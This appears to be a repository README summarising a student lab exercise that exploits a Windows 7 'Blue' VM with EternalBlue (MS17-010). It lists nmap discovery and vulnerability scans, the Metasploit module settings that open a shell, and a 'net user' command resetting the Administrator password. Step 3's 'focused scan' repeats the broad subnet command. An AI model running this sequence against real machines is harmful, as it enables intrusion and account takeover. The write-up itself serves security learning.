# Cyberpunk Report

By: Taaha Siddiqui Mohammed

A walkthrough of a lab-based penetration testing exercise performed against a Windows Blue virtual machine using Kali Linux. This report focuses on network discovery, vulnerability identification, and exploitation via the EternalBlue/MS17-010 SMB flaw.

> Source report: [Blue-Report-Taaha-Siddiqui.pdf](./Blue-Report-Taaha-Siddiqui.pdf)
>
> This repository contains the written report and summary, while the visual screenshots and terminal captures are included in the PDF.

## Overview

In this report, I demonstrate how a Windows Blue VM was identified and exploited from a Kali Linux environment using a series of reconnaissance and exploitation steps.

- Gain initial access on Kali Linux with `sudo su`
- Scan the local network to discover active hosts
- Enumerate the target system and open services
- Identify the SMB vulnerability (`MS17-010`)
- Use Metasploit to confirm the issue and exploit it
- Obtain a shell and modify the Windows administrator password

## Lab Setup

The exercise was performed in a controlled environment with:

- Kali Linux as the attacking machine
- Windows Blue VM running in the background
- Network scanning and vulnerability assessment tools

## Step-by-Step Workflow

### 1) Get root access in Kali Linux

```bash
sudo su
```

This gives elevated privileges so the reconnaissance and exploitation tools can be used effectively.

### 2) Network discovery with Nmap

The initial scan checks which hosts are alive on the local network.

```bash
nmap -sV 192.168.152.1/24
```

This reveals the live hosts and helps identify the target system.

### 3) Focused scan of the target machine

After narrowing down the target, a second scan is used to inspect open ports and detect specific services.

```bash
nmap -sV 192.168.152.1/24
```

This helps confirm that the target host is reachable and exposes SMB-related services.

### 4) Identify the target host

The host is discovered at:

```text
192.168.152.130
```

### 5) Optional nbtscan

This scan is useful for verifying the host is visible and discoverable on the network.

### 6) Deeper enumeration

A more thorough scan is run to gather details about the Windows target:

```bash
nmap -p- -A 192.168.152.130 --open
```

From the results:

- Target OS: Windows 7 Ultimate 7601
- SMB version: 2.1
- The system exposes services useful for exploitation

### 7) Vulnerability scanning

The next step checks whether the machine is exposed to known vulnerabilities.

```bash
nmap --script vuln 192.168.152.130
```

This reveals the presence of the `MS17-010` vulnerability, which is an SMB remote code execution flaw.

## Exploit: EternalBlue (MS17-010)

### 8) Launch Metasploit

```bash
msfconsole
```

Then search for the module:

```bash
search ms17-010
```

The EternalBlue exploit appears as a valid module for the SMB vulnerability.

### 9) Confirm the vulnerability

Using the auxiliary scanner module, the system is checked to ensure it is vulnerable before exploitation.

This step verifies the target is indeed affected by the SMB weakness and confirms the exploit path.

### 10) Run the EternalBlue exploit

Set the target IP as the `RHOST`, configure the attack host, and launch the exploit.

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.152.130
set LHOST <your-kali-ip>
run
```

Once the exploit succeeds, a shell is opened on the target system.

## Post-Exploitation

After gaining access, the system prompt is opened using:

```bash
shell
```

Then the administrator password is changed:

```cmd
net user Administrator hackedggwp
```

This provides access to the compromised Windows machine.

## Conclusion

The report demonstrates an ethical cybersecurity exercise where a vulnerable Windows machine was identified using Nmap, confirmed with SMB vulnerability scanning, and exploited via EternalBlue. The process highlights how a vulnerable service can be weaponized if left unpatched.

This is a lab-based demonstration intended for learning and defensive security research.

## Repository Contents

- `README.md` — project overview and summary
- `Blue-Report-Taaha-Siddiqui.pdf` — detailed report with screenshots and workflow documentation
- `Link to the Machine` — reference or supporting note for the target machine

## Note on Screenshots

The visual walkthrough, command output screenshots, and exploit results are embedded in the PDF report located at [Blue-Report-Taaha-Siddiqui.pdf](./Blue-Report-Taaha-Siddiqui.pdf). No separate image assets were present in the repository itself.

---

Thank you.
